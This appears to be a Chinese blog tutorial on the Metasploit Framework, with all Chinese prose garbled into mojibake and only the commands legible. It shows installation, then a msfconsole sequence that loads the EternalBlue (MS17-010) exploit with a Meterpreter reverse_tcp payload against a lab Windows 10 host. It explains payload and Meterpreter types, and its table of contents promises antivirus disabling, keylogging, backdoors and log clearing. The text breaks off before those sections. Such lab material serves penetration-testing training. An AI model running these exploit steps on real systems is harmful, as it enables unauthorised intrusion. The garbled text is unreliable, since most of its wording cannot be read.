<!doctype html><html><head><meta charset="utf-8"><title>MSFä½¿ç”¨æ•™ç¨‹</title><style>:root{--bg:#111315;--fg:#d6d6d6;--muted:#8b8b8b;--link:#8fa3ad;--link-hover:#c0d2db;--border:#2a2d30;--code-bg:#1a1d1f;--code-border:#2d3135}body{max-width:640px;margin:48px auto;padding:0 16px;background:var(--bg);color:var(--fg);font-family:'Noto Sans SC',system-ui,-apple-system,BlinkMacSystemFont;line-height:1.7}h1{font-size:1.2rem;font-weight:500;margin-bottom:12px}h2{font-size:1.1rem;font-weight:500;margin:2rem 0 1rem;color:var(--fg)}h3{font-size:1rem;font-weight:500;margin:1.5rem 0 0.75rem}.site-header{display:flex;align-items:center;gap:12px;margin-bottom:8px}.site-logo{height:10px;width:auto;display:block}nav{margin-bottom:32px;font-size:0.9rem}nav a{color:var(--muted);text-decoration:none;margin-right:12px}nav a:hover{color:var(--fg)}ul{list-style:none;padding:0;margin:0}li{margin:0.8rem 0}li a{color:var(--link);font-size:0.95rem;text-decoration:none}li a:hover{color:var(--link-hover)}.post-date{color:var(--muted);font-size:0.9rem}p{margin:1em 0}code{background:var(--code-bg);border:1px solid var(--code-border);border-radius:4px;padding:2px 6px;font-family:'Consolas','Monaco','Courier New',monospace;font-size:0.9em;color:#e6e6e6}pre{background:var(--code-bg);border:1px solid var(--code-border);border-radius:6px;padding:16px;overflow-x:auto;margin:1.5em 0}pre::-webkit-scrollbar{height:6px}pre::-webkit-scrollbar-track{background:var(--code-bg)}pre::-webkit-scrollbar-thumb{background:var(--code-border);border-radius:3px}pre::-webkit-scrollbar-thumb:hover{background:var(--muted)}pre code{background:none;border:none;padding:0;font-size:0.875em;line-height:1.6}blockquote{border-left:3px solid var(--border);padding-left:1em;margin:1.5em 0;color:var(--muted);font-style:italic}a{color:var(--link);text-decoration:none}a:hover{color:var(--link-hover)}img{max-width:100%;height:auto;border-radius:4px;margin:1.5em 0}hr{border:none;border-top:1px solid var(--border);margin:2rem 0}table{width:100%;border-collapse:collapse;margin:1.5em 0}th,td{border:1px solid var(--border);padding:8px 12px;text-align:left}th{background:var(--code-bg);font-weight:500}article ul,article ol{list-style:initial;padding-left:2em;margin:1em 0}article li{margin:0.5em 0}footer{margin-top:3rem;padding-top:2rem;border-top:1px solid var(--border);text-align:center}.footer-logo{height:32px;width:auto;display:inline-block;opacity:0.6;transition:opacity 0.3s}.footer-logo:hover{opacity:1}</style><style> .post-meta{display:flex;align-items:center;gap:10px;font-size:13px;color:var(--muted);margin-bottom:24px;flex-wrap:wrap;}.post-tags{display:flex;gap:8px;flex-wrap:wrap;}.tag{font-size:12px;color:var(--muted);text-decoration:none;}.tag::before{content:"#";opacity:.4;}.tag:hover{color:var(--fg);} </style><script> MathJax = { tex: { inlineMath: [['$', '$'], ['\\(', '\\)']], displayMath: [['$$', '$$'], ['\\[', '\\]']], processEscapes: true, processEnvironments: true }, options: { skipHtmlTags: ['script', 'noscript', 'style', 'textarea', 'pre'] } }; </script><script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js" async></script><link href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;700&display=swap" rel="stylesheet"></head><body><p><a href="/">â† index</a></p><h1>MSFä½¿ç”¨æ•™ç¨‹</h1><div class="post-meta"><span>2024-10-24</span><div class="post-tags"><a class="tag" href="/tags/å®‰å…¨">å®‰å…¨</a><a class="tag" href="/tags/Linux">Linux</a></div></div><article><h1>Metasploit Framework</h1><ul><li>å®éªŒç¯å¢ƒ</li><li>ç®€ä»‹</li><li>Metasploit çš„å®‰è£…å’Œæ›´æ–°å‡çº§</li><li>ä¸€é”®å®‰è£…MSF</li><li>MSF çš„æ›´æ–°å‡çº§<ol><li>é kali ç¯å¢ƒä¸‹æ›´æ–°å‡çº§ MSF</li><li>kali ç¯å¢ƒä¸‹æ›´æ–°å‡çº§ MSF</li></ol></li><li>ä½¿ç”¨æ–¹æ³•</li><li>åŸºç¡€ä½¿ç”¨</li><li><code>MSF</code> ä¸­åŠ è½½è‡ªå®šä¹‰çš„ <code>exploit æ¨¡å—</code></li><li>æ¼æ´åˆ©ç”¨ (exploit)</li><li>æ”»å‡»è½½è· (payload) 4.1 payload æ¨¡å—è·¯å¾„ 4.2 Metasploit ä¸­çš„ Payload æ¨¡å—ä¸»è¦æœ‰ä»¥ä¸‹ä¸‰ç§ç±»å‹</li><li>Meterpreter 5.1 Meterpreter æ˜¯å¦‚ä½•å·¥ä½œçš„ï¼Ÿ 5.2 Meterpreter çš„ç‰¹ç‚¹</li><li>MS17_010 (æ°¸æ’ä¹‹è“) 6.1 æŸ¥æ‰¾æ¼æ´ç›¸å…³æ¨¡å— 6.2 åˆ©ç”¨ <code>Auxiliary è¾…åŠ©æ¢æµ‹æ¨¡å—</code> å¯¹æ¼æ´è¿›è¡Œæ¢æµ‹ 6.3 ä½¿ç”¨ <code>Exploit æ¼æ´åˆ©ç”¨æ¨¡å—</code> å¯¹æ¼æ´è¿›è¡Œåˆ©ç”¨ 6.4 Payload æ”»å‡»è½½è·æ¨¡å—</li><li>åæ¸—é€é˜¶æ®µ 7.1 Post åæ¸—é€æ¨¡å— 7.2 æŸ¥çœ‹ä¸»æœºæ˜¯å¦è¿è¡Œåœ¨è™šæ‹Ÿæœºä¸Š 7.3 å…³é—­æ€æ¯’è½¯ä»¶ 7.4 è·å–ç›®æ ‡ä¸»æœºçš„è¯¦ç»†ä¿¡æ¯ 7.5 è®¿é—®æ–‡ä»¶ç³»ç»Ÿ 7.6 ä¸Šä¼  / ä¸‹è½½æ–‡ä»¶ 7.6.1 ä¸‹è½½æ–‡ä»¶ 7.6.2 ä¸Šä¼ æ–‡ä»¶ 7.7 æƒé™æå‡ 7.8 è·å–ç”¨æˆ·å¯†ç  7.9 è¿è¡Œç¨‹åº 7.11 å±å¹•æˆªå›¾ 7.12 åˆ›å»ºä¸€ä¸ªæ–°è´¦å· 7.13 å¯ç”¨è¿œç¨‹æ¡Œé¢ 7.14 é”®ç›˜è®°å½• 7.15 è¿›ç¨‹è¿ç§» 7.16 ç¦æ­¢ç›®æ ‡ä¸»æœºä½¿ç”¨é”®ç›˜é¼ æ ‡ 7.17 ç”¨ç›®æ ‡ä¸»æœºæ‘„åƒå¤´æ‹ç…§ 7.18 å¸¸ç”¨æ‰©å±•åº“ä»‹ç» 7.18.1 load/use å‘½ä»¤ 7.18.2 run å‘½ä»¤ 7.19 ç”ŸæˆæŒç»­æ€§åé—¨ 7.19.1 å¯åŠ¨é¡¹å¯åŠ¨ 7.19.2 æœåŠ¡å¯åŠ¨ 7.20 portfwd ç«¯å£è½¬å‘ 7.21 æ¸…é™¤äº‹ä»¶æ—¥å¿—</li><li>å¯¼å…¥å¹¶æ‰§è¡Œ PowerShell è„šæœ¬</li><li>åŠ è½½ stdapi</li><li>å‡çº§ Session</li></ul><hr /><h2>å®éªŒç¯å¢ƒ</h2><blockquote><p>é¶æœº<br> Windows10<br> 192.168.100.158</p><p>æ”»å‡»æœº<br> Linux Kali<br> 192.168.100.132</p></blockquote><hr /><h2>ç®€ä»‹</h2><p>Metasploit Framework(MSF) æ˜¯ä¸€æ¬¾å¼€æºå®‰å…¨æ¼æ´æ£€æµ‹å·¥å…·ï¼Œé™„å¸¦æ•°åƒä¸ªå·²çŸ¥çš„è½¯ä»¶æ¼æ´ï¼Œå¹¶ä¿æŒæŒç»­æ›´æ–°<br> Metasploit å¯ä»¥ç”¨æ¥ä¿¡æ¯æ”¶é›†ã€æ¼æ´æ¢æµ‹ã€æ¼æ´åˆ©ç”¨ç­‰æ¸—é€æµ‹è¯•çš„å…¨æµç¨‹<br> è¢«å®‰å…¨ç¤¾åŒºå† ä»¥ â€œå¯ä»¥é»‘æ‰æ•´ä¸ªå®‡å®™â€ ä¹‹å<br> åˆšå¼€å§‹çš„ Metasploit æ˜¯é‡‡ç”¨ Perl è¯­è¨€ç¼–å†™çš„ï¼Œä½†æ˜¯å†åæ¥çš„æ–°ç‰ˆä¸­ï¼Œæ”¹æˆäº†ç”¨ Ruby è¯­è¨€ç¼–å†™<br> åœ¨ kali ä¸­ï¼Œè‡ªå¸¦äº† Metasploit å·¥å…·<br> æˆ‘ä»¬æ¥ä¸‹æ¥ä»¥å¤§åé¼é¼çš„æ°¸æ’ä¹‹è“ MS17_010 æ¼æ´ä¸ºåˆ‡å…¥ç‚¹ï¼Œè®²è§£ MSF æ¡†æ¶çš„ä½¿ç”¨</p><hr /><h2>Metasploit çš„å®‰è£…å’Œæ›´æ–°å‡çº§</h2><h3>ä¸€é”®å®‰è£… MSF</h3><blockquote><p>åœ¨ä¸€èˆ¬çš„ linux ä¸­ï¼Œé»˜è®¤æ˜¯ä¸å®‰è£… MSF çš„<br> ä»¥ä¸‹æ˜¯åœ¨é kali çš„ Linux ä¸‹å®‰è£… MSF æ¡†æ¶</p></blockquote><p>æ‰€éœ€å‘½ä»¤:</p><pre><code class="language-bash">#ä¸€é”®å®‰è£…MSFï¼š curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall adduser msf #æ·»åŠ msfç”¨æˆ· su msf #åˆ‡æ¢åˆ°msfç”¨æˆ· cd /opt/metasploit-framework/bin #åˆ‡æ¢åˆ°msfæ‰€åœ¨çš„ç›®å½• ./msfconsole #ä»¥åå¯åŠ¨msfconsoleï¼Œéƒ½åˆ‡æ¢åˆ°msfç”¨æˆ·ä¸‹å¯åŠ¨ï¼Œè¿™æ ·ä¼šåŒæ­¥æ•°æ®åº“ã€‚å¦‚æœä½¿ç”¨rootç”¨æˆ·å¯åŠ¨çš„è¯ï¼Œä¸ä¼šåŒæ­¥æ•°æ®åº“ #ä¹Ÿå¯ä»¥å°†msfconsoleåŠ å…¥åˆ°æ‰§è¡Œç›®å½•ä¸‹ï¼Œè¿™æ ·åœ¨ä»»ä½•ç›®å½•ç›´æ¥msfconsoleå°±å¯ä»¥äº† ln -s /opt/metasploit-framework/bin/msfconsole /usr/bin/msfconsole #å¤‡æ³¨ï¼š #åˆæ¬¡è¿è¡Œmsfä¼šåˆ›å»ºæ•°æ®åº“ï¼Œä½†æ˜¯msfé»˜è®¤ä½¿ç”¨çš„PostgreSQLæ•°æ®åº“ä¸èƒ½ä¸rootç”¨æˆ·å…³è” #è¿™ä¹Ÿè¿™ä¹Ÿå°±æ˜¯éœ€è¦æ–°å»ºç”¨æˆ·msfæ¥è¿è¡Œmetasploitçš„åŸå› æ‰€åœ¨ #å¦‚æœä½ ä¸€ä¸å°å¿ƒæ‰‹ä¸€æŠ–ï¼Œåˆæ¬¡è¿è¡Œæ˜¯åœ¨rootç”¨æˆ·ä¸‹ #è¯·ä½¿ç”¨ msfdb reinit å‘½ä»¤ï¼Œç„¶åä½¿ç”¨érootç”¨æˆ·åˆå§‹åŒ–æ•°æ®åº“ # ékaliç¯å¢ƒä¸‹æ›´æ–°å‡çº§MSFï¼š msfupdate # MSFåæœŸçš„å‡çº§ # kaliç¯å¢ƒä¸‹æ›´æ–°å‡çº§MSFï¼š apt update # æ›´æ–°å®‰è£…åŒ…ä¿¡æ¯ï¼›åªæ£€æŸ¥ï¼Œä¸æ›´æ–°ï¼ˆå·²å®‰è£…çš„è½¯ä»¶åŒ…æ˜¯å¦æœ‰å¯ç”¨çš„æ›´æ–°ï¼Œç»™å‡ºæ±‡æ€»æŠ¥å‘Šï¼‰ apt upgrade # æ›´æ–°å·²å®‰è£…çš„è½¯ä»¶åŒ…ï¼Œä¸åˆ é™¤æ—§åŒ… apt full-upgrade # å‡çº§åŒ…ï¼Œåˆ é™¤æ—§åŒ… </code></pre><hr /><h3>MSF çš„æ›´æ–°å‡çº§</h3><h4>é kali ç¯å¢ƒä¸‹æ›´æ–°å‡çº§ MSF</h4><p>å‘½ä»¤ï¼š</p><pre><code class="language-bash">msfupdate #MSFåæœŸæ›´æ–°å‡çº§ </code></pre><h4>kali ç¯å¢ƒä¸‹æ›´æ–°å‡çº§ MSF</h4><blockquote><p>ç”±äº kali ä¸­çš„ Metasploit æ¸—é€æµ‹è¯•æ¡†æ¶æ˜¯é›†æˆåœ¨ç³»ç»Ÿä¸­çš„<br> ä¸æ˜¯å•ç‹¬å®‰è£…ï¼Œä¸æ”¯æŒä½¿ç”¨ msfupdate å‘½ä»¤æ›´æ–°<br> æ›´æ–°çš„è¯éœ€è¦éšç³»ç»Ÿç¨‹åºæ›´æ–°</p></blockquote><p>ä½¿ç”¨ msfupdate å‘½ä»¤ä¼šå‡ºç°ä¸‹é¢çš„æƒ…å†µ</p><pre><code class="language-bash">â”Œâ”€â”€(rootğŸ’€kali)-[~/desktop] â””â”€# msfupdate msfupdate is no longer supported when Metasploit is part of the operating system. Please use 'apt update; apt install metasploit-framework' </code></pre><p>åœ¨ kali ä¸­æ›´æ–° MSF ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤</p><pre><code class="language-bash">apt update # æ›´æ–°å®‰è£…åŒ…ä¿¡æ¯ï¼›åªæ£€æŸ¥ï¼Œä¸æ›´æ–°ï¼ˆå·²å®‰è£…çš„è½¯ä»¶åŒ…æ˜¯å¦æœ‰å¯ç”¨çš„æ›´æ–°ï¼Œç»™å‡ºæ±‡æ€»æŠ¥å‘Šï¼‰ apt upgrade # æ›´æ–°å·²å®‰è£…çš„è½¯ä»¶åŒ…ï¼Œä¸åˆ é™¤æ—§åŒ…ï¼› apt full-upgrade # å‡çº§åŒ…ï¼Œåˆ é™¤æ—§åŒ… </code></pre><p>ä½¿ç”¨ä¸Šé¢å‘½ä»¤ï¼Œæ˜¯åœ¨æ›´æ–°ç³»ç»Ÿç¨‹åºçš„åŒæ—¶ï¼ŒæŠŠ MSF æ›´æ–°</p><hr /><h2>ä½¿ç”¨æ–¹æ³•</h2><h3>åŸºç¡€ä½¿ç”¨</h3><pre><code class="language-bash">msfconsole #è¿›å…¥æ¡†æ¶ search ms17_010 # ä½¿ç”¨searchå‘½ä»¤æŸ¥æ‰¾ç›¸å…³æ¼æ´ use exploit/windows/smb/ms17_010_eternalblue # ä½¿ç”¨useè¿›å…¥æ¨¡å— info #ä½¿ç”¨infoæŸ¥çœ‹æ¨¡å—ä¿¡æ¯ set payload windows/x64/meterpreter/reverse_tcp #è®¾ç½®æ”»å‡»è½½è· show options #æŸ¥çœ‹æ¨¡å—éœ€è¦é…ç½®çš„å‚æ•° set RHOST 192.168.100.158 #è®¾ç½®å‚æ•° exploit / run #æ”»å‡» </code></pre><hr /><h3><code>MSF</code> ä¸­åŠ è½½è‡ªå®šä¹‰çš„ <code>exploitæ¨¡å—</code></h3><p><a href="https://blog.csdn.net/weixin_45588247/article/details/119488520?spm=1001.2014.3001.5501" title="CVE-2019-0708 è¿œç¨‹æ¡Œé¢æ¼æ´å¤ç°">å‚è€ƒCSDN-CVE-2019-0708 è¿œç¨‹æ¡Œé¢æ¼æ´å¤ç°</a></p><hr /><h3>æ¼æ´åˆ©ç”¨ (exploit)</h3><blockquote><p>æ¼æ´åˆ©ç”¨ exploitï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¸¸è¯´çš„ exp<br> ä»–å°±æ˜¯å¯¹æ¼æ´è¿›è¡Œæ”»å‡»çš„ä»£ç </p></blockquote><p>exploit æ¼æ´åˆ©ç”¨æ¨¡å—è·¯å¾„ (è¿™é‡Œé¢æœ‰é’ˆå¯¹ä¸åŒå¹³å°çš„ exploit)ï¼š</p><pre><code class="language-bash">/usr/share/metasploit-framework/modules/exploits </code></pre><hr /><h3>æ”»å‡»è½½è· (payload)</h3><p><strong>Payload</strong></p><blockquote><p><code>Payload</code> ä¸­åŒ…å«æ”»å‡»è¿›å…¥ç›®æ ‡ä¸»æœºåéœ€è¦åœ¨è¿œç¨‹ç³»ç»Ÿä¸­è¿è¡Œçš„æ¶æ„ä»£ç <br> è€Œåœ¨ <code>Metasploit</code> ä¸­ <code>Payload</code> æ˜¯ä¸€ç§ç‰¹æ®Šæ¨¡å—<br> å®ƒä»¬èƒ½å¤Ÿä»¥æ¼æ´åˆ©ç”¨æ¨¡å—è¿è¡Œ<br> å¹¶èƒ½å¤Ÿåˆ©ç”¨ç›®æ ‡ç³»ç»Ÿä¸­çš„å®‰å…¨æ¼æ´å®æ–½æ”»å‡»<br> ç®€è€Œè¨€ä¹‹ï¼Œè¿™ç§æ¼æ´åˆ©ç”¨æ¨¡å—å¯ä»¥è®¿é—®ç›®æ ‡ç³»ç»Ÿ<br> è€Œå…¶ä¸­çš„ä»£ç å®šä¹‰äº† <code>Payload</code> åœ¨ç›®æ ‡ç³»ç»Ÿä¸­çš„è¡Œä¸º</p></blockquote><p><strong>Shellcode</strong></p><blockquote><p><code>Shellcode</code> æ˜¯ <code>payload</code> ä¸­çš„ç²¾é«“éƒ¨åˆ†<br> åœ¨æ¸—é€æ”»å‡»æ—¶ä½œä¸ºæ”»å‡»è½½è·è¿è¡Œçš„ä¸€ç»„æœºå™¨æŒ‡ä»¤<br><code>Shellcode</code> é€šå¸¸ç”¨æ±‡ç¼–è¯­è¨€ç¼–å†™<br> åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œç›®æ ‡ç³»ç»Ÿæ‰§è¡Œäº† <code>shellcode</code>è¿™ä¸€ç»„æŒ‡ä»¤ä¹‹å<br> æ‰ä¼šæä¾›ä¸€ä¸ªå‘½ä»¤è¡Œ <code>shell</code></p></blockquote><h4>payload æ¨¡å—è·¯å¾„</h4><pre><code class="language-bash">/usr/share/metasploit-framework/modules/payloads </code></pre><h4>Metasploit ä¸­çš„ Payload æ¨¡å—ä¸»è¦æœ‰ä»¥ä¸‹ä¸‰ç§ç±»å‹</h4><p><strong>Single</strong>ï¼š</p><blockquote><p>æ˜¯ä¸€ç§å®Œå…¨ç‹¬ç«‹çš„ <code>Payload</code>ï¼Œè€Œä¸”ä½¿ç”¨èµ·æ¥å°±åƒè¿è¡Œ <code>calc.exe</code> ä¸€æ ·ç®€å•<br> ä¾‹å¦‚æ·»åŠ ä¸€ä¸ªç³»ç»Ÿç”¨æˆ·æˆ–åˆ é™¤ä¸€ä»½æ–‡ä»¶ã€‚ç”±äº <code>Single Payload</code> æ˜¯å®Œå…¨ç‹¬ç«‹çš„ï¼Œå› æ­¤å®ƒä»¬æœ‰å¯èƒ½ä¼šè¢«ç±»ä¼¼ <code>netcat</code> è¿™æ ·çš„é <code>metasploit</code> å¤„ç†å·¥å…·æ‰€æ•æ‰åˆ°</p><p><strong>Stager</strong>ï¼š<br> è¿™ç§ <code>Payload è´Ÿè´£å»ºç«‹ç›®æ ‡ç”¨æˆ·ä¸æ”»å‡»è€…ä¹‹é—´çš„ç½‘ç»œè¿æ¥</code>ï¼Œå¹¶ä¸‹è½½é¢å¤–çš„ç»„ä»¶æˆ–åº”ç”¨ç¨‹åº<br> ä¸€ç§å¸¸è§çš„ <code>Stager Payload</code> å°±æ˜¯ <code>reverse_tcp</code>ï¼Œå®ƒ<code>å¯ä»¥è®©ç›®æ ‡ç³»ç»Ÿä¸æ”»å‡»è€…å»ºç«‹ä¸€æ¡ tcp è¿æ¥</code>ï¼Œè®©ç›®æ ‡ç³»ç»Ÿä¸»åŠ¨è¿æ¥æˆ‘ä»¬çš„ç«¯å£ (åå‘è¿æ¥)<br> å¦ä¸€ç§å¸¸è§çš„æ˜¯ <code>bind_tcp</code>ï¼Œå®ƒå¯ä»¥<code>è®©ç›®æ ‡ç³»ç»Ÿå¼€å¯ä¸€ä¸ªtcpç›‘å¬å™¨ï¼Œè€Œæ”»å‡»è€…éšæ—¶å¯ä»¥ä¸ç›®æ ‡ç³»ç»Ÿè¿›è¡Œé€šä¿¡(æ­£å‘è¿æ¥)</code></p><p><strong>Stage</strong>ï¼š<br> æ˜¯ <code>Stager Payload</code> ä¸‹çš„ä¸€ç§ <code>Payloadç»„ä»¶</code><br> è¿™ç§ Payload å¯ä»¥æä¾›æ›´åŠ é«˜çº§çš„åŠŸèƒ½ï¼Œè€Œä¸”æ²¡æœ‰å¤§å°é™åˆ¶</p></blockquote><p>åœ¨ Metasploit ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ Payload çš„åç§°å’Œä½¿ç”¨æ ¼å¼æ¥æ¨æ–­å®ƒçš„ç±»å‹</p><pre><code class="language-bash">#Single Payloadçš„æ ¼å¼ä¸ºï¼š &lt;target&gt;/ &lt;single&gt; å¦‚ï¼šwindows/powershell_bind_tcp #Stager/Stage Payloadçš„æ ¼å¼ä¸ºï¼š &lt;target&gt;/ &lt;stage&gt; / &lt;stager&gt; å¦‚ï¼šwindows/meterpreter/reverse_tcp </code></pre><ul><li>å½“æˆ‘ä»¬åœ¨ Metasploit ä¸­æ‰§è¡Œ show payloads å‘½ä»¤ä¹‹åï¼Œå®ƒä¼šç»™æˆ‘ä»¬æ˜¾ç¤ºä¸€ä¸ªå¯ä½¿ç”¨çš„ Payload åˆ—è¡¨</li></ul><blockquote><p>åœ¨è¿™ä¸ªåˆ—è¡¨ä¸­ï¼Œåƒ <code>windows/powershell_bind_tcp</code> å°±æ˜¯ä¸€ä¸ª <code>Single Payload</code>ï¼Œå®ƒä¸åŒ…å« <code>Stage Payload</code><br> è€Œ <code>windows/meterpreter/reverse_tcp</code> åˆ™ç”±ä¸€ä¸ª <code>Stage Payload (meterpreter)</code>å’Œ ä¸€ä¸ª <code>Stager Payload (reverse_tcp)</code> ç»„æˆ</p></blockquote><p>Stager ä¸­å‡ ç§å¸¸è§çš„ payload</p><pre><code class="language-bash">windows/meterpreter/bind_tcp #æ­£å‘è¿æ¥ windows/meterpreter/reverse_tcp #åå‘è¿æ¥ï¼Œå¸¸ç”¨ windows/meterpreter/reverse_http #é€šè¿‡ç›‘å¬80ç«¯å£åå‘è¿æ¥ windows/meterpreter/reverse_https #é€šè¿‡ç›‘å¬443ç«¯å£åå‘è¿æ¥ </code></pre><ul><li><p>æ­£å‘è¿æ¥ä½¿ç”¨åœºæ™¯</p><blockquote><p>æˆ‘ä»¬çš„æ”»å‡»æœºåœ¨å†…ç½‘ç¯å¢ƒï¼Œè¢«æ”»å‡»æœºæ˜¯å¤–ç½‘ç¯å¢ƒï¼Œç”±äºè¢«æ”»å‡»æœºæ— æ³•ä¸»åŠ¨è¿æ¥åˆ°æˆ‘ä»¬çš„ä¸»æœºï¼Œæ‰€ä»¥å°±å¿…é¡»æˆ‘ä»¬ä¸»åŠ¨è¿æ¥è¢«æ”»å‡»æœºäº†<br> ä½†æ˜¯è¿™é‡Œç»å¸¸é‡åˆ°çš„é—®é¢˜æ˜¯ï¼Œè¢«æ”»å‡»æœºä¸Šå¼€äº†é˜²ç«å¢™ï¼Œåªå…è®¸è®¿é—®æŒ‡å®šçš„ç«¯å£ï¼Œæ¯”å¦‚è¢«æ”»å‡»æœºåªå¯¹å¤–å¼€æ”¾äº† 80 ç«¯å£<br> é‚£ä¹ˆï¼Œæˆ‘ä»¬å°±åªèƒ½è®¾ç½®æ­£å‘è¿æ¥ 80 ç«¯å£äº†ï¼Œè¿™é‡Œå¾ˆæœ‰å¯èƒ½å¤±è´¥ï¼Œå› ä¸º 80 ç«¯å£ä¸Šçš„æµé‡å¤ªå¤šäº†</p></blockquote></li><li><p>åå‘è¿æ¥ä½¿ç”¨åœºæ™¯</p><blockquote><p>æˆ‘ä»¬çš„ä¸»æœºå’Œè¢«æ”»å‡»æœºéƒ½æ˜¯åœ¨å¤–ç½‘æˆ–è€…éƒ½æ˜¯åœ¨å†…ç½‘ï¼Œè¿™æ ·è¢«æ”»å‡»æœºå°±èƒ½ä¸»åŠ¨è¿æ¥åˆ°æˆ‘ä»¬çš„ä¸»æœºäº†<br> å¦‚æœæ˜¯è¿™æ ·çš„æƒ…å†µï¼Œå»ºè®®ä½¿ç”¨åå‘è¿æ¥<br> å› ä¸ºåå‘è¿æ¥çš„è¯ï¼Œå³ä½¿è¢«æ”»å‡»æœºå¼€äº†é˜²ç«å¢™ä¹Ÿæ²¡äº‹ï¼Œé˜²ç«å¢™åªæ˜¯é˜»æ­¢è¿›å…¥è¢«æ”»å‡»æœºçš„æµé‡ï¼Œè€Œä¸ä¼šé˜»æ­¢è¢«æ”»å‡»æœºä¸»åŠ¨å‘å¤–è¿æ¥çš„æµé‡</p></blockquote></li><li><p>åå‘è¿æ¥80å’Œ443ç«¯å£ä½¿ç”¨åœºæ™¯</p><blockquote><p>è¢«æ”»å‡»æœºèƒ½ä¸»åŠ¨è¿æ¥åˆ°æˆ‘ä»¬çš„ä¸»æœºï¼Œè¿˜æœ‰å°±æ˜¯è¢«æ”»å‡»æœºçš„é˜²ç«å¢™è®¾ç½®çš„ç‰¹åˆ«ä¸¥æ ¼<br> å°±è¿è¢«æ”»å‡»æœºè®¿é—®å¤–éƒ¨ç½‘ç»œçš„æµé‡ä¹Ÿè¿›è¡Œäº†ä¸¥æ ¼çš„é™åˆ¶<br> åªå…è®¸è¢«æ”»å‡»æœºçš„ 80 ç«¯å£æˆ– 443 ç«¯å£ä¸å¤–éƒ¨é€šä¿¡</p></blockquote></li></ul><hr /><h3>Meterpreter</h3><blockquote><p><code>Meterpreter</code> å±äº <code>stage payload</code><br> åœ¨ <code>Metasploit Framework</code> ä¸­ï¼Œ<code>Meterpreter</code> æ˜¯ä¸€ç§<code>åæ¸—é€å·¥å…·</code><br> å®ƒå±äºä¸€ç§åœ¨è¿è¡Œè¿‡ç¨‹ä¸­å¯é€šè¿‡ç½‘ç»œè¿›è¡ŒåŠŸèƒ½æ‰©å±•çš„<code>åŠ¨æ€å¯æ‰©å±•å‹ Payload</code><br> è¿™ç§å·¥å…·æ˜¯åŸºäº <code>å†…å­˜ DLL æ³¨å…¥</code> ç†å¿µå®ç°çš„<br> å®ƒèƒ½å¤Ÿé€šè¿‡åˆ›å»ºä¸€ä¸ª<code>æ–°è¿›ç¨‹å¹¶è°ƒç”¨æ³¨å…¥çš„ DLL</code> æ¥è®©<code>ç›®æ ‡ç³»ç»Ÿè¿è¡Œæ³¨å…¥çš„ DLLæ–‡ä»¶</code></p></blockquote><h4>Meterpreter æ˜¯å¦‚ä½•å·¥ä½œçš„ï¼Ÿ</h4><blockquote><p>é¦–å…ˆç›®æ ‡å…ˆè¦æ‰§è¡Œåˆå§‹çš„æº¢å‡ºæ¼æ´ä¼šè¯è¿æ¥ï¼Œå¯èƒ½æ˜¯ <code>bind æ­£å‘è¿æ¥</code>ï¼Œæˆ–è€…<code>åå¼¹ reverse è¿æ¥</code><br> åå°„è¿æ¥çš„æ—¶å€™<code>åŠ è½½ dll é“¾æ¥æ–‡ä»¶</code>ï¼ŒåŒæ—¶<code>åå°æ‚„æ‚„å¤„ç† dll æ–‡ä»¶</code><br> å…¶æ¬¡ <code>Meterpreter</code> æ ¸å¿ƒä»£ç åˆå§‹åŒ–ï¼Œé€šè¿‡ <code>socket å¥—æ¥å­—</code>å»ºç«‹ä¸€ä¸ª <code>TLS/1.0</code> åŠ å¯†éš§é“å¹¶å‘é€ <code>GET è¯·æ±‚</code> ç»™ <code>Metasploit æœåŠ¡ç«¯</code><br><code>Metasploit æœåŠ¡ç«¯</code>æ”¶åˆ°è¿™ä¸ª <code>GET</code> è¯·æ±‚åå°±é…ç½®ç›¸åº”å®¢æˆ·ç«¯<br> æœ€åï¼Œ<code>Meterpreter</code> åŠ è½½æ‰©å±•ï¼Œæ‰€æœ‰çš„æ‰©å±•è¢«åŠ è½½éƒ½é€šè¿‡ <code>TLS/1.0</code> è¿›è¡Œæ•°æ®ä¼ è¾“</p></blockquote><h4>Meterpreter çš„ç‰¹ç‚¹</h4><ul><li><code>Meterpreter</code> å®Œå…¨é©»ç•™åœ¨å†…å­˜ï¼Œæ²¡æœ‰å†™å…¥åˆ°ç£ç›˜ã€‚</li><li><code>Meterpreter</code> æ³¨å…¥çš„æ—¶å€™ä¸ä¼šäº§ç”Ÿæ–°çš„è¿›ç¨‹ï¼Œå¹¶å¯ä»¥å¾ˆå®¹æ˜“çš„ç§»æ¤åˆ°å…¶å®ƒæ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ã€‚</li><li>é»˜è®¤æƒ…å†µä¸‹ï¼Œ <code>Meterpreter</code> çš„é€šä¿¡æ˜¯åŠ å¯†çš„ï¼Œæ‰€ä»¥å¾ˆå®‰å…¨ã€‚</li><li>æ‰©å±•æ€§ï¼Œè®¸å¤šæ–°çš„ç‰¹å¾æ¨¡å—å¯ä»¥è¢«åŠ è½½ã€‚</li></ul><p>æˆ‘ä»¬åœ¨è®¾ç½® <code>payloads</code> æ—¶ï¼Œå¯ä»¥å°† <code>payloads</code> è®¾ç½®ä¸ºï¼š<code>windows/meterpreter/reverse_tcp</code><br> ç„¶åè·å¾—äº† <code>meterpreter&gt;</code> ä¹‹åæˆ‘ä»¬å°±å¯ä»¥å¹²å¾ˆå¤šäº‹äº†</p><hr /><h3>MS17_010 (æ°¸æ’ä¹‹è“)</h3><blockquote><p>æˆ‘ä»¬ç°åœ¨æ¨¡æ‹Ÿä½¿ç”¨ MS17_010 æ¼æ´æ”»å‡»<br> è¿™ä¸ªæ¼æ´å°±æ˜¯å»å¹´å±å®³å…¨çƒçš„å‹’ç´¢ç—…æ¯’åˆ©ç”¨çš„æ°¸æ’ä¹‹è“æ¼æ´</p></blockquote><h4>æŸ¥æ‰¾æ¼æ´ç›¸å…³æ¨¡å—</h4><ol><li>åœ¨ kali å‘½ä»¤è¡Œé‡Œé¢è¾“å…¥å‘½ä»¤ msfconsoleï¼Œè¿›å…¥ msf æ¡†æ¶ä¸­</li></ol><pre><code class="language-bash">msfconsole 